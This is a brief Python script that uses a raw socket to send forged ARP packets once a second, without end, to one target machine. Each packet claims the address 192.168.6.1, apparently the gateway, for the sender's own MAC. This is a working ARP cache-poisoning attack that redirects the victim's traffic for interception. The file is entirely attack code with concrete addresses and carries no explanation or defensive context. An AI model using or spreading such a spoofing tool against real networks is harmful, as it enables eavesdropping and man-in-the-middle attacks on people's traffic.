import socket
import time
from header.eth import *
from header.arp import *

sock = socket.socket( socket.AF_PACKET, socket.SOCK_RAW )
sock.bind( ('eth0', socket.SOCK_RAW) )

eth = Eth()
arp = Arp()

# d0:50:99:7b:97:b4
eth.dst = 'd0:50:99:7b:97:b4'
eth.src = '00:50:56:31:A8:43'
eth.type = 0x0806

arp.hw_type = 1
arp.hw_size = 6
arp.protocol_type = 0x0800
arp.protocol_size = 4
arp.opcode = 1
arp.target_mac = '00:00:00:00:00:00'
arp.target_ip = '192.168.6.21'
arp.sender_mac = '00:50:56:31:A8:43'
arp.sender_ip = '192.168.6.1'

while True:
  sock.send( eth.header + arp.header )
  time.sleep(1)
















